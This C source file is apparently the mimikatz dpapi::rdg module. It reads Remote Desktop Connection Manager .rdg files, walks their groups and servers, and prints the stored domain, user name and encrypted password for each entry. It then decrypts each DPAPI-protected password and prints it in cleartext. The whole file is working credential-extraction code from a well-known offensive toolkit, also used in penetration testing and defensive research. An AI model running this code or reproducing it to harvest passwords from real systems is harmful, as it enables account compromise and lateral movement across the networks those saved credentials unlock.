/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_dpapi_rdg.h"

NTSTATUS kuhl_m_dpapi_rdg(int argc, wchar_t * argv[])
{
	PCWSTR filename;
	IXMLDOMDocument *pXMLDom;
	IXMLDOMNode *pNode;

	if(kull_m_string_args_byName(argc, argv, L"in", &filename, NULL))
	{
		if(pXMLDom = kull_m_xml_CreateAndInitDOM())
		{
			if(kull_m_xml_LoadXMLFile(pXMLDom, filename))
			{
				if((IXMLDOMDocument_selectSingleNode(pXMLDom, (BSTR) L"//RDCMan/file", &pNode) == S_OK) && pNode)
				{
					kprintf(L"<ROOT>\n");
					kuhl_m_dpapi_rdg_Groups(1, pNode, argc, argv);
				}
			}
			kull_m_xml_ReleaseDom(pXMLDom);
		}
	}
	else PRINT_ERROR(L"Missing /in:filename.rdg\n");
	return STATUS_SUCCESS;
}

void kuhl_m_dpapi_rdg_Groups(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[])
{
	IXMLDOMNodeList *pGroups;
	IXMLDOMNode *pGroup, *pProperties;
	DOMNodeType type;
	long lengthGroups, i;
	wchar_t *name;

	kuhl_m_dpapi_rdg_LogonCredentials(level, pNode, argc, argv);
	kuhl_m_dpapi_rdg_Servers(level, pNode, argc, argv);
	if((IXMLDOMNode_selectNodes(pNode, L"group", &pGroups) == S_OK) && pGroups)
	{
		if(IXMLDOMNodeList_get_length(pGroups, &lengthGroups) == S_OK)
		{
			for(i = 0; i < lengthGroups; i++)
			{
				if((IXMLDOMNodeList_get_item(pGroups, i, &pGroup) == S_OK) && pGroup)
				{
					if((IXMLDOMNode_get_nodeType(pGroup, &type) == S_OK) && (type == NODE_ELEMENT))
					{
						if((IXMLDOMNode_selectSingleNode(pGroup, L"properties", &pProperties) == S_OK) && pProperties)
						{
							if(name = kull_m_xml_getTextValue(pProperties, L"name"))
							{
								kprintf(L"%*s" L"<%s>\n", level << 1, L"", name);
								LocalFree(name);
							}
						}
						kuhl_m_dpapi_rdg_Groups(level + 1, pGroup, argc, argv);
					}
					IXMLDOMNode_Release(pGroup);
				}
			}
		}
	}
}

void kuhl_m_dpapi_rdg_Servers(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[])
{
	IXMLDOMNodeList *pServers;
	IXMLDOMNode *pServer, *pProperties;
	DOMNodeType type;
	long lengthServers, i;
	wchar_t *name;

	if((IXMLDOMNode_selectNodes(pNode, L"server", &pServers) == S_OK) && pServers)
	{
		if(IXMLDOMNodeList_get_length(pServers, &lengthServers) == S_OK)
		{
			for(i = 0; i < lengthServers; i++)
			{
				if((IXMLDOMNodeList_get_item(pServers, i, &pServer) == S_OK) && pServer)
				{
					if((IXMLDOMNode_get_nodeType(pServer, &type) == S_OK) && (type == NODE_ELEMENT))
					{
						if((IXMLDOMNode_selectSingleNode(pServer, L"properties", &pProperties) == S_OK) && pProperties)
						{
							if(name = kull_m_xml_getTextValue(pProperties, L"name"))
							{
								kprintf(L"%*s" L"| %s\n", level << 1, L"", name);
								LocalFree(name);
							}
						}
						kuhl_m_dpapi_rdg_LogonCredentials(level + 1, pServer, argc, argv);
					}
					IXMLDOMNode_Release(pServer);
				}
			}
		}
	}
}

void kuhl_m_dpapi_rdg_LogonCredentials(DWORD level, IXMLDOMNode *pNode, int argc, wchar_t * argv[])
{
	IXMLDOMNode *pLogonCredentialsNode;
	wchar_t *userName, *domain, *password;
	LPBYTE data;
	LPVOID pDataOut;
	DWORD szData, dwDataOutLen;

	if((IXMLDOMNode_selectSingleNode(pNode, L"logonCredentials", &pLogonCredentialsNode) == S_OK) && pLogonCredentialsNode)
	{
		if(userName = kull_m_xml_getTextValue(pLogonCredentialsNode, L"userName"))
		{
			if(domain = kull_m_xml_getTextValue(pLogonCredentialsNode, L"domain"))
			{
				if(password = kull_m_xml_getTextValue(pLogonCredentialsNode, L"password"))
				{
					kprintf(L"%*s" L"* %s \\ %s : %s\n", level << 1, L"", domain, userName, password);
					if(kull_m_string_quick_base64_to_Binary(password, &data, &szData))
					{
						if(szData >= (sizeof(DWORD) + sizeof(GUID)))
						{
							if(RtlEqualGuid((PBYTE) data + sizeof(DWORD), &KULL_M_DPAPI_GUID_PROVIDER))
							{
								if(kuhl_m_dpapi_unprotect_raw_or_blob(data, szData, NULL, argc, argv, NULL, 0, &pDataOut, &dwDataOutLen, NULL))
									kprintf(L"%*s" L">> cleartext password: %.*s\n", level << 1, L"", dwDataOutLen / sizeof(wchar_t), pDataOut);
							}
							else PRINT_ERROR(L"Maybe certificate encryption (todo)\n");
						}
						else PRINT_ERROR(L"szData: %u\n", szData);
						LocalFree(data);
					}
					LocalFree(password);
				}
				LocalFree(domain);
			}
			LocalFree(userName);
		}
	}
}